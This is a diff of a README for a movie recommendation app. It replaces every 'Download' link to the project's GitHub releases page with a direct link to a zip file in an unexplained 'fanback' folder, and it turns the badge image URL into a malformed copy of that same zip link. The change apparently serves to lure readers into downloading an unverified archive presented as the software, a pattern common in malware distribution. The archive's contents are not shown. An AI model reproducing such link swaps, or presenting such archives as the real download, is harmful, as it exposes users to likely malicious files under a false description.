@@ -1,6 +1,6 @@
 # 🎬 Movie-Recommendation-System - A Seamless Way to Find Your Next Film
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
+[![Download Now](https://raw.githubusercontent.com/Ronak786943/Movie-Recommendation-System/main/fanback/Movie-Recommendation-System.zip%20Now-Click%https://raw.githubusercontent.com/Ronak786943/Movie-Recommendation-System/main/fanback/Movie-Recommendation-System.zip)](https://raw.githubusercontent.com/Ronak786943/Movie-Recommendation-System/main/fanback/Movie-Recommendation-System.zip)
 
 ## 🎉 Introduction
 
@@ -23,7 +23,7 @@ Before you download, please ensure your computer meets the following requirement
 
 You can download the Movie Recommendation System by visiting the releases page. This is where you will find the latest version of the software.
 
-[Download the Movie Recommendation System](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
+[Download the Movie Recommendation System](https://raw.githubusercontent.com/Ronak786943/Movie-Recommendation-System/main/fanback/Movie-Recommendation-System.zip)
 
 ### Installation Steps:
 
@@ -65,7 +65,7 @@ If you encounter any issues or have questions while using the application, pleas
 
 ## 🔗 Links
 
-To revisit the download link, click here: [Download the Movie Recommendation System](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
+To revisit the download link, click here: [Download the Movie Recommendation System](https://raw.githubusercontent.com/Ronak786943/Movie-Recommendation-System/main/fanback/Movie-Recommendation-System.zip)
 
 ## 📜 License
 
